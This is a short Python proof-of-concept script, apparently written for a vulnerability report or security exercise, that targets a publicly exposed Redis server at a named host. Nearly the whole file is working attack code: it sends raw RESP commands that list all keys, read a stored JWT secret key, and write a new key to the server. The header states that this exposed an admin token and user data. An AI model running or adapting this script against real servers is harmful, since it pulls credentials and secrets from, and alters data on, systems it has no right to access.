# ============================================================
#  Author: Joseane Silva
#  Vulnerability: Publicly accessible Redis
#  Target: redis.0x10.cloud
# ============================================================
#  
#  DESCRIPTION
#  
#   Redis db is publicly accessible.
#   I used the RESP (redis serialization protocol) to communicate 
#   with the Redis server. Throughout the communication process by 
#   running defined commands (ping, key, get, set), I was able to find
#   that the responses returned that I could access the admin 
#   token, user data, and a secret jwt key.
#
# ============================================================

import socket

print("=" * 50)
print("     PUBLICLY ACCESSIBLE REDIS")
print("=" * 50)


# This function formats the commands to a redis readable format (RESP).
# It establishes a communication with the redis server, sends the command, gets the response and closes the connection.
def send_redis_command(command):
    command_parts = command.split()
    cmd = f"*{len(command_parts)}\r\n"

    for part in command_parts:
        part = str(part)
        cmd += f"${len(part)}\r\n{part}\r\n"
    
    try:
        sock = socket.create_connection(("redis.0x10.cloud", 6379))
        sock.sendall(cmd.encode())
        response = sock.recv(4096).decode().strip()
        return response
    finally:
        sock.close()

# Defining commands to run
commands = (
    "PING",
    "KEYS *",
    "GET secret:jwt_key",
    "SET joseane silva",
)

# Run commands on Redis server and print the responses
for command in commands:
    print(f"Running ---------- {command}")
    resp = send_redis_command(command)
    print("\t Response:", resp)


print(f"\n  [!] VULNERABILITY")
print("-" * 25)
print("Risk: Redis db information is visible, which could lead to leaking sensitive information")
print("-" * 25)